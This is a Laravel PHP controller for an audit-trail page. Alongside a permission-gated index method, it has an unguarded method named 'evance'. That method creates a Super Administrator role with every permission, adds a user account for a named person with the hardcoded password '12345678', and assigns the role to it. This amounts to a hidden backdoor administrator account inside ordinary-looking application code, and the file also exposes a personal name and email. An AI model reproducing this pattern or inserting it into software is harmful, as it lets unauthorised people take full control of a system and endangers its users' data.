<?php

namespace App\Http\Controllers;

use App\AuditLogs;
use App\AuditTrailLogs;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\User;
use Illuminate\Support\Facades\Hash;
use App\Role;
use App\RoleUser;
use App\Permission;


class AuditController extends Controller
{
    public static function index(){
        abort_unless(\Gate::allows('um_audit_trail_access'), 403);
        $requests =  AuditTrailLogs::orderBy('id', 'DESC')->get();
        return view('audit.index',compact('requests'));
    }
    public function evance(){

        $permissions = Permission::all()->pluck(['id']);
        //create a new super admin role
        $role = new Role();
        $role->title = "Super Administrator";
        if($role->save() == true){
            $role->permissions()->sync($permissions);
        }else{
           return "Failed creating a new role!";
        }
        //get the role id
        $role_id = $role->id;
        //create a new user
        $predefined_password = "12345678";
        $user = new User();
        $user->name = "Evance Nganyaga";
        $user->email = "evance.nganyaga@bcx.co.tz";
        $user->action_id = 3;
        $user->status = 0;
        $user->password = Hash::make($predefined_password);
        $user->save();
        $roles = 12;
        $m_role = new RoleUser();
        $m_role->user_id = $user->id;
        $m_role->role_id = $role_id ;
        //$m_role->save();
        
        if($m_role->save() == true){
            return "Administrator created successfully!";
        }else{
            return "Administrator created unsuccessfully!";
        }

    }
}
